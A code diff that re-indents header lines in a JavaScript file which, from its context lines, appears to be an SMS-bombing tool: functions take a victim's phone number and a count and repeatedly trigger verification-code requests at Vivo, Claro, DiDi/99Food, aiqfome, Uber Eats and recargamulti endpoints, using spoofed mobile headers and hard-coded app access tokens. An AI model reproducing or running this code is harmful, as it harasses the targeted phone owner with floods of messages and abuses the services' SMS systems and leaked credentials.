@@ -53,16 +53,16 @@ async function op1(numero, quantidade) {
 	
 	var vivo = await tools.curl('https://login.vivo.com.br/mobile/br/com/vivo/mobile/portlets/loginmobile/sendTokenRequest.do', 'numero='+numero, {
 		'Host': 'login.vivo.com.br',
-        'Connection': 'keep-alive',
-        'Accept': '*/*',
-        'X-Requested-With': 'XMLHttpRequest',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://login.vivo.com.br',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Dest': 'empty',
-        'Referer': 'https://login.vivo.com.br/mobile/appmanager/env/publico'
+		'Connection': 'keep-alive',
+		'Accept': '*/*',
+		'X-Requested-With': 'XMLHttpRequest',
+		'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36',
+		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+		'Origin': 'https://login.vivo.com.br',
+		'Sec-Fetch-Site': 'same-origin',
+		'Sec-Fetch-Mode': 'cors',
+		'Sec-Fetch-Dest': 'empty',
+		'Referer': 'https://login.vivo.com.br/mobile/appmanager/env/publico'
 		}, 'POST').then((res) => {
 			var response = JSON.parse(res.body);
 			if (response["code"] == 0) {
@@ -111,16 +111,16 @@ async function op2(numero, quantidade) {
 	
 	var claro = await tools.curl('https://claro-recarga-api.m4u.com.br/sms-tokens/', `{"msisdn":"${numero}","target":"token","origin":"login"}`, {
 		'Host': 'claro-recarga-api.m4u.com.br',
-        'Connection': 'keep-alive',
-        'Accept': 'application/json, text/plain, */*',
-        'Channel': 'CLARO_WEB_DESKTOP',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
-        'Content-Type': 'application/json',
-        'Origin': 'https://clarorecarga.claro.com.br',
-        'Sec-Fetch-Site': 'cross-site',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Dest': 'empty',
-        'Referer': 'https://clarorecarga.claro.com.br/recarga/login'
+		'Connection': 'keep-alive',
+		'Accept': 'application/json, text/plain, */*',
+		'Channel': 'CLARO_WEB_DESKTOP',
+		'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
+		'Content-Type': 'application/json',
+		'Origin': 'https://clarorecarga.claro.com.br',
+		'Sec-Fetch-Site': 'cross-site',
+		'Sec-Fetch-Mode': 'cors',
+		'Sec-Fetch-Dest': 'empty',
+		'Referer': 'https://clarorecarga.claro.com.br/recarga/login'
 		}, 'POST').then((res) => {
 			if (res.statusCode == 204) {
 				
@@ -159,10 +159,10 @@ async function op3(numero, quantidade) {
 	
 	var food99 = await tools.curl('https://epassport.didiglobal.com/passport/login/v5/codeMT', 'q=%7B%22cell%22%3A%22'+numero+'%22%2C%22code_type%22%3A0%2C%22api_version%22%3A%221.0.2%22%2C%22app_version%22%3A%221.2.46%22%2C%22appid%22%3A50032%2C%22canonical_country_code%22%3A%22BR%22%2C%22channel%22%3A%220%22%2C%22city_id%22%3A0%2C%22country_calling_code%22%3A%22%2B55%22%2C%22country_id%22%3A76%2C%22device_name%22%3A%22r5q%22%2C%22imei%22%3A%22b03a06ea835db9acbcfb37b874abdcc1A0A70271E2E8064991A49111D5BCFC8B%22%2C%22lang%22%3A%22pt-BR%22%2C%22lat%22%3A0.0%2C%22lng%22%3A0.0%2C%22model%22%3A%22SM-G770F%22%2C%22network_type%22%3A%22WIFI%22%2C%22omega_id%22%3A%22CDrEB7bwQYmIR4AvLLoe3g%22%2C%22os%22%3A%2210%22%2C%22role%22%3A1%2C%22scene%22%3A1%2C%22suuid%22%3A%22CE830195FA71CA10E08876DA6AB79268%22%2C%22utcoffset%22%3A0%7D', {
 		'User-Agent': 'Android/10 didihttp OneNet/2.1.0.94 com.xiaojukeji.didi.brazil.customer/1.2.46',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Transfer-Encoding': 'chunked',
-        'Host': 'epassport.didiglobal.com',
-        'Connection': 'Keep-Alive'
+		'Content-Type': 'application/x-www-form-urlencoded',
+		'Transfer-Encoding': 'chunked',
+		'Host': 'epassport.didiglobal.com',
+		'Connection': 'Keep-Alive'
 		}, 'POST').then((res) => {
 			var response = JSON.parse(res.body);
 			if (response["errno"] == 0) {
@@ -210,9 +210,9 @@ async function op4(numero, quantidade) {
 	
 	var aiqfome = await tools.curl('https://edivaldo.aiqfome.com/verificacaoNumero/iniciarVerificacao', 'usuario_id=2437702&numero_destino=%2B55'+numero+'&token_numero='+token+'&plataforma=android&versao_app=0.6.8&token=679a3efc5faa5dda6d73254813d84951cb860635&pais_id=1', {
 		'Connection': 'Keep-Alive',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; SM-G770F Build/QP1A.190711.020)',
-        'Host': 'edivaldo.aiqfome.com'
+		'Content-Type': 'application/x-www-form-urlencoded',
+		'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; SM-G770F Build/QP1A.190711.020)',
+		'Host': 'edivaldo.aiqfome.com'
 		}, 'POST').then((res) => {
 			var response = JSON.parse(res.body);
 			if (response["error"] == false) {
@@ -252,13 +252,13 @@ async function op5(numero, quantidade) {
 	
 	var ubereats = await tools.curl('https://cn-phx2.cfe.uber.com/rt/silk-screen/submit-form', `{"formContainerAnswer":{"formAnswer":{"flowType":"INITIAL","screenAnswers":[{"screenType":"PHONE_NUMBER_INITIAL","fieldAnswers":[{"fieldType":"PHONE_COUNTRY_CODE","phoneCountryCode":"55"},{"fieldType":"PHONE_NUMBER","phoneNumber":"${numero}"},{"fieldType":"THIRD_PARTY_CLIENT_ID","thirdPartyClientID":""}]}],"firstPartyClientID":""}}}`, {
 		'Host': 'cn-phx2.cfe.uber.com',
-        'x-uber-client-name': 'eats',
-        'x-uber-device': 'android',
-        'x-uber-device-language': 'pt_BR',
-        'x-uber-client-version': '1.277.10005',
-        'accept': 'application/json',
-        'content-type': 'application/json; charset=UTF-8',
-        'user-agent': 'okhttp/3.12.0-uber2'
+		'x-uber-client-name': 'eats',
+		'x-uber-device': 'android',
+		'x-uber-device-language': 'pt_BR',
+		'x-uber-client-version': '1.277.10005',
+		'accept': 'application/json',
+		'content-type': 'application/json; charset=UTF-8',
+		'user-agent': 'okhttp/3.12.0-uber2'
 		}, 'POST').then((res) => {
 			if (res.body.match(/SIGN_IN/i)) {
 				
@@ -303,14 +303,14 @@ async function op6(numero, quantidade) {
 	
 	var recargamulti = await tools.curl('https://cce-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
 		'Accept': 'application/json',
-        'X-MIP-APP-VERSION': '4.2.0',
-        'X-MIP-CHANNEL': 'CCEANDROID',
-        'X-MIP-ACCESS-TOKEN': '728D6030-35A9-CCCE-AD19-A773CE0E4769',
-        'Content-Type': 'application/json; charset=UTF-8',
-        'Content-Length': '26',
-        'Host': 'cce-app.recargamulti.com.br',
-        'Connection': 'Keep-Alive',
-        'User-Agent': 'okhttp/3.10.0'
+		'X-MIP-APP-VERSION': '4.2.0',
+		'X-MIP-CHANNEL': 'CCEANDROID',
+		'X-MIP-ACCESS-TOKEN': '728D6030-35A9-CCCE-AD19-A773CE0E4769',
+		'Content-Type': 'application/json; charset=UTF-8',
+		'Content-Length': '26',
+		'Host': 'cce-app.recargamulti.com.br',
+		'Connection': 'Keep-Alive',
+		'User-Agent': 'okhttp/3.10.0'
 		}, 'POST').then((res) => {
 			var response = JSON.parse(res.body);
 			if (response["success"]) {
@@ -338,14 +338,14 @@ async function op6(numero, quantidade) {
 	tools.sleep(2000);
 	var recargamulti2 = await tools.curl('https://brightstar-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
 		'Accept': 'application/json',
-        'X-MIP-APP-VERSION': '4.2.0',
-        'X-MIP-CHANNEL': 'BRIGHTSTARANDROID',
-        'X-MIP-ACCESS-TOKEN': 'F917BC34-BB7C-4308-BAEB-62E72DB5EE42',
-        'Content-Type': 'application/json; charset=UTF-8',
-        'Content-Length': '26',
-        'Host': 'brightstar-app.recargamulti.com.br',
-        'Connection': 'Keep-Alive',
-        'User-Agent': 'okhttp/3.10.0'
+		'X-MIP-APP-VERSION': '4.2.0',
+		'X-MIP-CHANNEL': 'BRIGHTSTARANDROID',
+		'X-MIP-ACCESS-TOKEN': 'F917BC34-BB7C-4308-BAEB-62E72DB5EE42',
+		'Content-Type': 'application/json; charset=UTF-8',
+		'Content-Length': '26',
+		'Host': 'brightstar-app.recargamulti.com.br',
+		'Connection': 'Keep-Alive',
+		'User-Agent': 'okhttp/3.10.0'
 		}, 'POST').then((res) => {
 			var response = JSON.parse(res.body);
 			if (response["success"]) {
@@ -367,14 +367,14 @@ async function op6(numero, quantidade) {
 	tools.sleep(2000);
 	var recargamulti3 = await tools.curl('https://multirecarga-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
 		'Accept': 'application/json',
-        'X-MIP-APP-VERSION': '4.2.1',
-        'X-MIP-CHANNEL': 'MULTIRECARGAANDROID',
-        'X-MIP-ACCESS-TOKEN': '385D5040-8414-11E5-A837-0800200C9A66',
-        'Content-Type': 'application/json; charset=UTF-8',
-        'Content-Length': '26',
-        'Host': 'multirecarga-app.recargamulti.com.br',
-        'Connection': 'Keep-Alive',
-        'User-Agent': 'okhttp/3.10.0'
+		'X-MIP-APP-VERSION': '4.2.1',
+		'X-MIP-CHANNEL': 'MULTIRECARGAANDROID',
+		'X-MIP-ACCESS-TOKEN': '385D5040-8414-11E5-A837-0800200C9A66',
+		'Content-Type': 'application/json; charset=UTF-8',
+		'Content-Length': '26',
+		'Host': 'multirecarga-app.recargamulti.com.br',
+		'Connection': 'Keep-Alive',
+		'User-Agent': 'okhttp/3.10.0'
 		}, 'POST').then((res) => {
 			var response = JSON.parse(res.body);
 			if (response["success"]) {
@@ -396,14 +396,14 @@ async function op6(numero, quantidade) {
 	tools.sleep(2000);
 	var recargamulti4 = await tools.curl('https://alcatel-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
 		'Accept': 'application/json',
-        'X-MIP-APP-VERSION': '4.2.0',
-        'X-MIP-CHANNEL': 'ALCATELANDROID',
-        'X-MIP-ACCESS-TOKEN': '242D4F54-0D61-41F2-998F-EF4D57AAA060',
-        'Content-Type': 'application/json; charset=UTF-8',
-        'Content-Length': '26',
-        'Host': 'alcatel-app.recargamulti.com.br',
-        'Connection': 'Keep-Alive',
-        'User-Agent': 'okhttp/3.10.0'
+		'X-MIP-APP-VERSION': '4.2.0',
+		'X-MIP-CHANNEL': 'ALCATELANDROID',
+		'X-MIP-ACCESS-TOKEN': '242D4F54-0D61-41F2-998F-EF4D57AAA060',
+		'Content-Type': 'application/json; charset=UTF-8',
+		'Content-Length': '26',
+		'Host': 'alcatel-app.recargamulti.com.br',
+		'Connection': 'Keep-Alive',
+		'User-Agent': 'okhttp/3.10.0'
 		}, 'POST').then((res) => {
 			var response = JSON.parse(res.body);
 			if (response["success"]) {
@@ -424,14 +424,14 @@ async function op6(numero, quantidade) {
 	tools.sleep(2000);
 	var recargamulti6 = await tools.curl('https://samsung-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
 		'Accept': 'application/json',
-        'X-MIP-APP-VERSION': '4.2.0',
-        'X-MIP-CHANNEL': 'ALCATELANDROID',
-        'X-MIP-ACCESS-TOKEN': '2A5DE230-3DAB-4E65-A65B-70CC698D5DEB',
-        'Content-Type': 'application/json; charset=UTF-8',
-        'Content-Length': '26',
-        'Host': 'samsung-app.recargamulti.com.br',
-        'Connection': 'Keep-Alive',
-        'User-Agent': 'okhttp/3.10.0'
+		'X-MIP-APP-VERSION': '4.2.0',
+		'X-MIP-CHANNEL': 'ALCATELANDROID',
+		'X-MIP-ACCESS-TOKEN': '2A5DE230-3DAB-4E65-A65B-70CC698D5DEB',
+		'Content-Type': 'application/json; charset=UTF-8',
+		'Content-Length': '26',
+		'Host': 'samsung-app.recargamulti.com.br',
+		'Connection': 'Keep-Alive',
+		'User-Agent': 'okhttp/3.10.0'
 		}, 'POST').then((res) => {
 			var response = JSON.parse(res.body);
 			if (response["success"]) {
